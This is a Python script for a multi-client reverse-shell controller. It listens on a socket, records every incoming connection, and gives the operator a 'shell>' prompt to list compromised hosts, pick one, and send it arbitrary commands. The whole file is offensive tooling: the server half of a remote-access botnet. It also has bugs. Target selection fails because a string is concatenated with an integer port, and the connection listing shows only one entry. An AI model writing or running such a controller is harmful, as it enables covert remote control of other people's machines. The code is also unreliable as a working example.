import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []


#   Creating a socket
def create_socket():
    try:
        global host
        global port
        global s
        host = '127.0.0.1'
        port = 9999

        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error " + str(msg))
    else:
        print("Socket Created Successfully")


#       Binding the Socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the Port "+str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding Error " + str(msg))
        print("Retrying....")
        bind_socket()


#       handing Connections from Multiple clients
def accepting_connections():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)        # prevents time out from happening

            all_connections.append(conn)
            all_address.append(address)

            print("Connection Established with " + address[0] + ":"+str(address[1]))
        except:
            print('Error Accepting Errors')


def shell():
    while True:
        cmd = input("shell> ")

        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("option not recognized")


#       Display Connections
def list_connections():
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_address[i]
            continue
        results = str(i) + ' - ' + str(all_address[i][0]) + ' - ' + str(all_address[i][1]) + '\n'
    print(results)


def get_target(cmd):
    try:
        target = int(cmd.replace('select ', ''))
        conn = all_connections[target]
        print("Connection Established with - " + all_address[target][0] + ":" + all_address[target][1])
        print(str(all_address[target][0]) + ">", end="")
        return conn
    except:
        print("Select proper value")
        return None


def send_target_commands(conn):
    while(True):
        try:
            cmd = input()

            if cmd == 'quit':
                break

            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "UTF-8")
                print(client_response, end="")
        except:
            print("Error While Sending Commands")
            break


def create_workers():
    for i in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


def create_jobs():
    for i in JOB_NUMBER:
        queue.put(i)
    queue.join()


def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            shell()
        queue.task_done()


create_workers()
create_jobs()
